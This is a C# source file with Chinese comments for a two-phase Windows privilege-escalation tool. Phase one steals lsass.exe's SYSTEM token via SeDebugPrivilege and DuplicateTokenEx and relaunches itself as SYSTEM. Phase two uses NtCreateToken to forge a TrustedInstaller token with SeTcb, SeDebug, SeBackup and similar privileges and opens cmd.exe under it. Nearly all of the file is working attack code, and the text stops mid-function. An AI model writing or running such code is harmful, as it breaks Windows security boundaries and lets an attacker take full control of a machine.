// ============================================================================
//  NtCreateTokenFull.cs — tinew8（共修复 30 项，含两阶段提权）
//  窃取 lsass SYSTEM 令牌 + NtCreateToken 铸造 TrustedInstaller 令牌
//
//  编译：csc /langversion:8 NtCreateTokenFull.cs
//  运行：以管理员身份运行
//
//  [修复#21] 两阶段启动：
//    Phase1 (Admin)  → CreateProcessWithTokenW 重启自身为 SYSTEM 进程
//    Phase2 (SYSTEM) → 在进程令牌上启用 SeCreateTokenPrivilege → NtCreateToken
//
//  修复历史（v27→v30 增量）：
//    #28  构建真实 DefaultDacl（SYSTEM+Admins+Owner GENERIC_ALL）
//    #29  用 CreateEnvironmentBlock 为 TI 令牌创建专属环境块
//    #30  添加 Logon Session SID (S-1-5-5-0-999) 到令牌组
//    全局  AdjustTokenPrivileges → NtAdjustPrivilegesToken (ntdll.dll) change lsass -> lsass
// ============================================================================

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;

namespace NtCreateTokenFull
{
    // ========================================================================
    //  SafeTokenHandle
    // ========================================================================
    [SuppressUnmanagedCodeSecurity]
    sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeTokenHandle() : base(true) { }

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        protected override bool ReleaseHandle() => CloseHandle(handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);
    }

    // ========================================================================
    //  主程序入口
    // ========================================================================
    class Program
    {
        static readonly string SidTrustedInstaller =
            "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
        static readonly string SidSystem = "S-1-5-18";

        // [修复#21] 两阶段入口
        static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "--phase2")
                Phase2_CreateTIToken();
            else
                Phase1_RelaunchAsSystem();
        }

        // ================================================================
        //  阶段 1：以管理员身份运行 → 窃取 SYSTEM 令牌 → 重启自身
        // ================================================================
        static void Phase1_RelaunchAsSystem()
        {
            Console.WriteLine("=== NtCreateToken 提权工具 [阶段1: 获取 SYSTEM] ===\n");

            try
            {
                Console.WriteLine("  [*] 启用 SeDebugPrivilege...");
                TokenThief.EnableDebugPrivilege();
                Console.WriteLine("  [+] SeDebugPrivilege 已启用");

                int lsassPid = TokenThief.GetlsassPid();
                Console.WriteLine($"  [*] lsass.exe PID = {lsassPid}");

                using var systemToken = TokenThief.DuplicateProcessToken(lsassPid);
                Console.WriteLine("  [+] SYSTEM 令牌复制成功");

                string selfPath;
                using (var self = Process.GetCurrentProcess())
                    selfPath = self.MainModule.FileName;
                Console.WriteLine($"  [*] 自身路径: {selfPath}");

                Console.WriteLine("  [*] 授权 SYSTEM 访问桌面...");
                DesktopAccess.GrantAccess(SidSystem);
                Console.WriteLine("  [+] 桌面权限已授予");

                Console.WriteLine("  [*] 以 SYSTEM 身份重新启动...");
                ProcessLauncher.LaunchWithToken(systemToken, selfPath, "--phase2");
                Console.WriteLine("  [+] SYSTEM 进程已启动，请查看新窗口");

                Console.WriteLine("\n=== 阶段 1 完成，按任意键退出此窗口 ===");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[-] 阶段1错误: {ex.Message}");
                Console.WriteLine($"    详情: {ex}");
                Console.WriteLine("\n按任意键退出...");
                Console.ReadKey();
            }
        }

        // ================================================================
        //  阶段 2：已经以 SYSTEM 身份运行 → NtCreateToken → 启动 cmd
        // ================================================================
        static void Phase2_CreateTIToken()
        {
            Console.WriteLine("=== NtCreateToken 提权工具 [阶段2: 创建 TI 令牌] ===\n");

            try
            {
                // [修复#23] 用 SID 比较验证身份
                var currentIdentity = WindowsIdentity.GetCurrent();
                string currentSid = currentIdentity.User?.Value ?? "";
                Console.WriteLine($"  [+] 当前进程身份: {currentIdentity.Name} (SID={currentSid})");

                if (!string.Equals(currentSid, "S-1-5-18", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("  [-] 错误：当前进程不是 SYSTEM 身份！");
                    Console.WriteLine($"      当前 SID: {currentSid}，期望: S-1-5-18");
                    Console.WriteLine("      请通过阶段1启动，不要直接运行 --phase2");
                    Console.ReadKey();
                    return;
                }

                Console.WriteLine("\n  [*] 启用必需特权（进程令牌）...");
                Privilege.Enable("SeCreateTokenPrivilege");
                Console.WriteLine("  [+] SeCreateTokenPrivilege 已启用");
                Privilege.Enable("SeAssignPrimaryTokenPrivilege");
                Console.WriteLine("  [+] SeAssignPrimaryTokenPrivilege 已启用");
                Privilege.Enable("SeIncreaseQuotaPrivilege");
                Console.WriteLine("  [+] SeIncreaseQuotaPrivilege 已启用");
                Privilege.Enable("SeTcbPrivilege");
                Console.WriteLine("  [+] SeTcbPrivilege 已启用");

                uint currentSessionId;
                using (var curProc = Process.GetCurrentProcess())
                    currentSessionId = (uint)curProc.SessionId;
                Console.WriteLine($"  [*] Session ID = {currentSessionId}");

                Console.WriteLine("\n  [*] 调用 NtCreateToken 创建 TrustedInstaller 令牌...");

                using var newToken = TokenCreator.CreatePrimaryToken(
                    userSidString: SidTrustedInstaller,
                    groupSids: new[]
                    {
                        (SidTrustedInstaller,           TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.Everyone,        TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.Local,           TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.AuthUsers,       TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.Interactive,     TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.ConsoleLogon,    TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        // [修复#24] 进程初始化所需的关键组
                        (WellKnownSids.BuiltinUsers,    TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        (WellKnownSids.BuiltinAdmins,   TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory | TokenCreator.GroupAttributes.EnabledByDefault),
                        (WellKnownSids.Service,         TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        // [修复#30] SYSTEM 登录会话 SID — CSRSS ALPC 端口需要
                        (WellKnownSids.SystemLogonSession, TokenCreator.GroupAttributes.Enabled | TokenCreator.GroupAttributes.Mandatory),
                        // 完整性级别必须放最后
                        (WellKnownSids.SystemIntegrity, TokenCreator.GroupAttributes.Integrity | TokenCreator.GroupAttributes.IntegrityEnabled),
                    },
                    privileges: new[]
                    {
                        // [修复#25] 完整特权集
                        ("SeChangeNotifyPrivilege",           TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeImpersonatePrivilege",            TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeIncreaseQuotaPrivilege",          TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeCreateGlobalPrivilege",           TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeAssignPrimaryTokenPrivilege",     TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeTcbPrivilege",                    TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeBackupPrivilege",                 TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeRestorePrivilege",                TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeDebugPrivilege",                  TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeIncreaseWorkingSetPrivilege",     TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeTakeOwnershipPrivilege",          TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeSecurityPrivilege",               TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeShutdownPrivilege",               TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeSystemProfilePrivilege",          TokenCreator.PrivilegeAttributes.Enabled),
                        ("SeUndockPrivilege",                 TokenCreator.PrivilegeAttributes.Enabled),
                    },
                    expiry: null
                );

                Console.WriteLine($"  [+] Token 创建成功，句柄: 0x{newToken.DangerousGetHandle():X}");

                TokenCreator.SetTokenSessionId(newToken, currentSessionId);
                Console.WriteLine($"  [+] Token Session ID 已设置为 {currentSessionId}");

                Console.WriteLine("  [*] 授权 TrustedInstaller 访问桌面...");
                DesktopAccess.GrantAccess(SidTrustedInstaller);
                Console.WriteLine("  [+] 桌面权限已授予");

                Console.WriteLine("\n  [*] 以 TrustedInstaller 身份启动 cmd.exe...");
                ProcessLauncher.Launch(newToken, @"C:\Windows\System32\cmd.exe");

                Console.WriteLine("\n=== 完成！新 cmd.exe 窗口已以 TrustedInstaller 身份运行 ===");
                Console.WriteLine("按任意键退出此窗口...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[-] 阶段2错误: {ex.Message}");
                Console.WriteLine($"    详情: {ex}");
                Console.WriteLine("\n按任意键退出...");
                Console.ReadKey();
            }
        }
    }

    // ========================================================================
    //  常用 SID 常量
    // ========================================================================
    static class WellKnownSids
    {
        public const string Everyone           = "S-1-1-0";
        public const string Local              = "S-1-2-0";
        public const string AuthUsers          = "S-1-5-11";
        public const string Interactive        = "S-1-5-4";
        public const string ConsoleLogon       = "S-1-2-1";
        public const string SystemIntegrity    = "S-1-16-16384";
        // [修复#24]
        public const string BuiltinUsers       = "S-1-5-32-545";   // BUILTIN\Users
        public const string BuiltinAdmins      = "S-1-5-32-544";   // BUILTIN\Administrators
        public const string Service            = "S-1-5-6";        // NT AUTHORITY\SERVICE
        // [修复#30] SYSTEM_LUID=0x3e7=999 → Logon Session SID
        public const string SystemLogonSession = "S-1-5-5-0-999";
    }

    // ========================================================================
    //  DesktopAccess：授权 Window Station 和 Desktop
    // ========================================================================
    static class DesktopAccess
    {
        const int  DACL_SECURITY_INFORMATION    = 0x04;
        const uint ACL_REVISION                 = 2;
        const uint SECURITY_DESCRIPTOR_REVISION = 1;
        const int  AclSizeInformation           = 2;
        const uint READ_CONTROL                 = 0x00020000;
        const uint WRITE_DAC                    = 0x00040000;
        const uint WINSTA_ALL_ACCESS            = 0x37F;
        const uint DESKTOP_ALL_ACCESS           = 0x01FF;

        const byte ACCESS_ALLOWED_ACE_TYPE = 0x00;

        [StructLayout(LayoutKind.Sequential)]
        struct ACL_SIZE_INFORMATION
        {
            public uint AceCount;
            public uint AclBytesInUse;
            public uint AclBytesFree;
        }

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr OpenWindowStation(string name, bool inherit, uint desiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseWindowStation(IntPtr hWinSta);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr OpenDesktop(string name, uint flags, bool inherit, uint access);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetUserObjectSecurity(
            IntPtr hObj, ref int pSIRequested, IntPtr pSD, uint nLength, out uint nLengthNeeded);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetUserObjectSecurity(
            IntPtr hObj, ref int pSIRequested, IntPtr pSD);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetSecurityDescriptorDacl(
            IntPtr pSD, out bool bDaclPresent, out IntPtr pDacl, out bool bDaclDefaulted);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetAclInformation(
            IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInfo, uint nAclInfoLength, int dwAclInfoClass);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetAce(IntPtr pAcl, uint dwAceIndex, out IntPtr pAce);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AddAce(IntPtr pAcl, uint dwAceRevision,
            uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AddAccessAllowedAce(
            IntPtr pAcl, uint dwAceRevision, uint AccessMask, IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeSecurityDescriptor(IntPtr pSD, uint dwRevision);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetSecurityDescriptorDacl(
            IntPtr pSD, bool bDaclPresent, IntPtr pDacl, bool bDaclDefaulted);

        [DllImport("advapi32.dll")]
        static extern uint GetLengthSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool ConvertStringSidToSid(string stringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool EqualSid(IntPtr pSid1, IntPtr pSid2);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        public static void GrantAccess(string sidString)
        {
            IntPtr pSid = IntPtr.Zero;
            try
            {
                if (!ConvertStringSidToSid(sidString, out pSid))
                    throw new Win32Exception();

                IntPtr hWinSta = OpenWindowStation("WinSta0", false, READ_CONTROL | WRITE_DAC);
                if (hWinSta == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error(),
                        "OpenWindowStation 失败");
                try
                {
                    AddAceToObject(hWinSta, pSid, WINSTA_ALL_ACCESS);
                }
                finally
                {
                    CloseWindowStation(hWinSta);
                }

                IntPtr hDesktop = OpenDesktop("Default", 0, false, READ_CONTROL | WRITE_DAC);
                if (hDesktop == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error(),
                        "OpenDesktop 失败");
                try
                {
                    AddAceToObject(hDesktop, pSid, DESKTOP_ALL_ACCESS);
                }
                finally
                {
                    CloseDesktop(hDesktop);
                }
            }
            finally
            {
                if (pSid != IntPtr.Zero) LocalFree(pSid);
            }
        }

        static void AddAceToObject(IntPtr handle, IntPtr pSid, uint accessMask)
        {
            int siFlag = DACL_SECURITY_INFORMATION;

            GetUserObjectSecurity(handle, ref siFlag, IntPtr.Zero, 0, out uint sdSize);

            IntPtr pSD = Marshal.AllocHGlobal((int)sdSize);
            try
            {
                if (!GetUserObjectSecurity(handle, ref siFlag, pSD, sdSize, out _))
                    throw new Win32Exception();

                if (!GetSecurityDescriptorDacl(pSD, out bool daclPresent, out IntPtr pDacl, out _))
                    throw new Win32Exception();

                uint existingAclBytesInUse = 8;
                uint existingAceCount = 0;

                if (daclPresent && pDacl != IntPtr.Zero)
                {
                    var aclInfo = new ACL_SIZE_INFORMATION();
                    if (!GetAclInformation(pDacl, ref aclInfo,
                        (uint)Marshal.SizeOf<ACL_SIZE_INFORMATION>(), AclSizeInformation))
                        throw new Win32Exception();
                    existingAclBytesInUse = aclInfo.AclBytesInUse;
                    existingAceCount = aclInfo.AceCount;

                    if (HasMatchingAce(pDacl, existingAceCount, pSid, accessMask))
                        return;
                }

                uint sidLength = GetLengthSid(pSid);
                uint newAceSize = 8 + sidLength;
                uint newAclSize = existingAclBytesInUse + newAceSize;

                IntPtr pNewAcl = Marshal.AllocHGlobal((int)newAclSize);
                try
                {
                    if (!InitializeAcl(pNewAcl, newAclSize, ACL_REVISION))
                        throw new Win32Exception();

                    if (daclPresent && pDacl != IntPtr.Zero)
                    {
                        for (uint i = 0; i < existingAceCount; i++)
                        {
                            if (!GetAce(pDacl, i, out IntPtr pAce))
                                throw new Win32Exception();
                            uint aceSize = (uint)(ushort)Marshal.ReadInt16(pAce, 2);
                            if (!AddAce(pNewAcl, ACL_REVISION, 0xFFFFFFFF, pAce, aceSize))
                                throw new Win32Exception();
                        }
                    }

                    if (!AddAccessAllowedAce(pNewAcl, ACL_REVISION, accessMask, pSid))
                        throw new Win32Exception();

                    IntPtr pNewSD = Marshal.AllocHGlobal(64);
                    try
                    {
                        if (!InitializeSecurityDescriptor(pNewSD, SECURITY_DESCRIPTOR_REVISION))
                            throw new Win32Exception();
                        if (!SetSecurityDescriptorDacl(pNewSD, true, pNewAcl, false))
                            throw new Win32Exception();

                        if (!SetUserObjectSecurity(handle, ref siFlag, pNewSD))
                            throw new Win32Exception();
                    }
                    finally { Marshal.FreeHGlobal(pNewSD); }
                }
                finally { Marshal.FreeHGlobal(pNewAcl); }
            }
            finally { Marshal.FreeHGlobal(pSD); }
        }

        static bool HasMatchingAce(IntPtr pDacl, uint aceCount, IntPtr pTargetSid, uint requiredMask)
        {
            for (uint i = 0; i < aceCount; i++)
            {
                if (!GetAce(pDacl, i, out IntPtr pAce))
                    continue;

                byte aceType = Marshal.ReadByte(pAce, 0);
                if (aceType != ACCESS_ALLOWED_ACE_TYPE)
                    continue;

                uint aceMask = (uint)Marshal.ReadInt32(pAce, 4);
                IntPtr pAceSid = IntPtr.Add(pAce, 8);

                if (EqualSid(pAceSid, pTargetSid) && (aceMask & requiredMask) == requiredMask)
                    return true;
            }
            return false;
        }
    }

    // ========================================================================
    //  TokenThief：窃取 lsass.exe 的 SYSTEM 令牌
    // ========================================================================
    static class TokenThief
    {
        const uint TOKEN_DUPLICATE           = 0x0002;
        const uint TOKEN_QUERY               = 0x0008;
        const uint TOKEN_ADJUST_PRIVILEGES   = 0x0020;
        const uint MAXIMUM_ALLOWED           = 0x02000000;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint SE_PRIVILEGE_ENABLED      = 0x00000002;
        const int  SecurityImpersonation     = 2;
        const int  TokenPrimary              = 1;

        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES_SINGLE
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr proc, uint access, out SafeTokenHandle handle);

        [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "OpenProcessToken")]
        static extern bool OpenProcessTokenRaw(IntPtr proc, uint access, out IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);

        // AdjustTokenPrivileges → NtAdjustPrivilegesToken
        // 注意: DisableAllPrivileges 是 BOOLEAN (1字节)，用 UnmanagedType.U1 映射
        [DllImport("ntdll.dll")]
        static extern int NtAdjustPrivilegesToken(
            IntPtr TokenHandle,
            [MarshalAs(UnmanagedType.U1)] bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES_SINGLE NewState,
            uint BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);

        [DllImport("ntdll.dll")]
        static extern uint RtlNtStatusToDosError(int status);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr existing, uint access, IntPtr attrs,
            int impLevel, int tokenType, out SafeTokenHandle newToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);

        public static void EnableDebugPrivilege()
        {
            if (!OpenProcessToken(GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out SafeTokenHandle tok))
                throw new Win32Exception();
            try
            {
                if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out var luid))
                    throw new Win32Exception();
                var tp = new TOKEN_PRIVILEGES_SINGLE
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES
                    { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                };

                int status = NtAdjustPrivilegesToken(
                    tok.DangerousGetHandle(),
                    false,
                    ref tp,
                    0,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (status != 0)
                {
                    uint dosErr = RtlNtStatusToDosError(status);
                    throw new Win32Exception((int)dosErr,
                        $"无法启用 SeDebugPrivilege (NTSTATUS=0x{status:X8})，请以管理员身份运行！");
                }
            }
            finally { tok.Dispose(); }
        }

        // [修复#22] 按当前会话 ID 过滤 lsass.exe
        public static int GetlsassPid()
        {
            int currentSessionId;
            using (var me = Process.GetCurrentProcess())
                currentSessionId = me.SessionId;

            var procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0)
                throw new InvalidOperationException("未找到 lsass.exe 进程");

            int pid = -1;
            try
            {
                foreach (var p in procs)
                {
                    if (p.SessionId == currentSessionId)
                    {
                        pid = p.Id;
                        break;
                    }
                }
                if (pid == -1)
                    pid = procs[0].Id;
            }
            finally
            {
                foreach (var p in procs) p.Dispose();
            }
            return pid;
        }

        public static SafeTokenHandle DuplicateProcessToken(int pid)
        {
            IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess 失败");
            try
            {
                if (!OpenProcessTokenRaw(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out IntPtr hToken))
                    throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcessToken(target) 失败");
                try
                {
                    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero,
                        SecurityImpersonation, TokenPrimary, out var dupToken))
                        throw new Win32Exception(Marshal.GetLastWin32Error(), "DuplicateTokenEx 失败");
                    return dupToken;
                }
                finally { CloseHandle(hToken); }
            }
            finally { CloseHandle(hProcess); }
        }
    }

    // ========================================================================
    //  Privilege：启用当前线程/进程的指定特权
    // ========================================================================
    static class Privilege
    {
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY             = 0x0008;
        const uint SE_PRIVILEGE_ENABLED    = 0x00000002;

        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES_HEADER { public uint PrivilegeCount; }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr proc, uint acc, out SafeTokenHandle handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr thread, uint acc,
            bool openAsSelf, out SafeTokenHandle handle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);

        // AdjustTokenPrivileges → NtAdjustPrivilegesToken
        [DllImport("ntdll.dll")]
        static extern int NtAdjustPrivilegesToken(
            IntPtr TokenHandle,
            [MarshalAs(UnmanagedType.U1)] bool DisableAllPrivileges,
            IntPtr NewState,
            uint BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);

        [DllImport("ntdll.dll")]
        static extern uint RtlNtStatusToDosError(int status);

        public static void Enable(string privilegeName)
        {
            SafeTokenHandle tok;

            // 优先尝试线程令牌（模拟场景），回退到进程令牌（Phase2 场景）
            if (!OpenThreadToken(GetCurrentThread(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, false, out tok))
            {
                if (!OpenProcessToken(GetCurrentProcess(),
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tok))
                    throw new Win32Exception();
            }

            try
            {
                if (!LookupPrivilegeValue(null, privilegeName, out var luid))
                    throw new Win32Exception();

                int szHeader = Marshal.SizeOf<TOKEN_PRIVILEGES_HEADER>();
                int szEntry  = Marshal.SizeOf<LUID_AND_ATTRIBUTES>();
                IntPtr buf = Marshal.AllocHGlobal(szHeader + szEntry);
                try
                {
                    Marshal.WriteInt32(buf, 1);  // PrivilegeCount = 1
                    var la = new LUID_AND_ATTRIBUTES
                    {
                        Luid = luid,
                        Attributes = SE_PRIVILEGE_ENABLED
                    };
                    Marshal.StructureToPtr(la, IntPtr.Add(buf, szHeader), false);

                    int status = NtAdjustPrivilegesToken(
                        tok.DangerousGetHandle(),
                        false,
                        buf,
                        0,
                        IntPtr.Zero,
                        IntPtr.Zero);

                    if (status != 0)
                    {
                        uint dosErr = RtlNtStatusToDosError(status);
                        throw new Win32Exception((int)dosErr,
                            $"无法启用 {privilegeName} (NTSTATUS=0x{status:X8})");
                    }
                }
                finally { Marshal.FreeHGlobal(buf); }
            }
            finally { tok.Dispose(); }
        }
    }

    // ========================================================================
    //  TokenCreator：通过 NtCreateToken 从零构造令牌
    // ========================================================================
    static class TokenCreator
    {
        public const uint TOKEN_ALL_ACCESS            = 0xF01FF;
        public const uint SE_GROUP_MANDATORY           = 0x00000001;
        public const uint SE_GROUP_ENABLED_BY_DEFAULT  = 0x00000002;
        public const uint SE_GROUP_ENABLED             = 0x00000004;
        public const uint SE_GROUP_INTEGRITY           = 0x00000020;
        public const uint SE_GROUP_INTEGRITY_ENABLED   = 0x00000040;
        public const uint SE_PRIVILEGE_ENABLED         = 0x00000002;

        [Flags]
        public enum GroupAttributes : uint
        {
            Mandatory        = SE_GROUP_MANDATORY,
            EnabledByDefault = SE_GROUP_ENABLED_BY_DEFAULT,
            Enabled          = SE_GROUP_ENABLED,
            Integrity        = SE_GROUP_INTEGRITY,
            IntegrityEnabled = SE_GROUP_INTEGRITY_ENABLED,
        }

        [Flags]
        public enum PrivilegeAttributes : uint
        {
            Enabled = SE_PRIVILEGE_ENABLED
        }

        enum TOKEN_TYPE : int { TokenPrimary = 1 }
        const int TokenSessionId = 12;

        const uint ACL_REVISION = 2;
        const uint GENERIC_ALL  = 0x10000000;

        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        struct LARGE_INTEGER { public long QuadPart; }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct TOKEN_SOURCE
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
            public string SourceName;
            public LUID SourceIdentifier;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES { public IntPtr Sid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_OWNER { public IntPtr Owner; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIMARY_GROUP { public IntPtr PrimaryGroup; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_DEFAULT_DACL { public IntPtr DefaultDacl; }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES_HEADER { public uint PrivilegeCount; }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS_LAYOUT
        {
            public uint GroupCount;
            public SID_AND_ATTRIBUTES FirstGroup;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_QUALITY_OF_SERVICE
        {
            public int Length;
            public int ImpersonationLevel;
            public byte ContextTrackingMode;
            public byte EffectiveOnly;
        }

        [DllImport("ntdll.dll")]
        static extern int NtCreateToken(
            out SafeTokenHandle TokenHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            TOKEN_TYPE TokenType,
            ref LUID AuthenticationId,
            ref LARGE_INTEGER ExpirationTime,
            IntPtr TokenUser,
            IntPtr TokenGroups,
            IntPtr TokenPrivileges,
            ref TOKEN_OWNER TokenOwner,
            ref TOKEN_PRIMARY_GROUP TokenPrimaryGroup,
            ref TOKEN_DEFAULT_DACL TokenDefaultDacl,
            ref TOKEN_SOURCE TokenSource);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr Sid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetTokenInformation(
            SafeTokenHandle tokenHandle, int tokenInformationClass,
            ref uint tokenInformation, int tokenInformationLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AddAccessAllowedAce(
            IntPtr pAcl, uint dwAceRevision, uint AccessMask, IntPtr pSid);

        [DllImport("advapi32.dll")]
        static extern uint GetLengthSid(IntPtr pSid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        static void LocalFreeIfNotNull(IntPtr p)
        {
            if (p != IntPtr.Zero) LocalFree(p);
        }

        public static void SetTokenSessionId(SafeTokenHandle token, uint sessionId)
        {
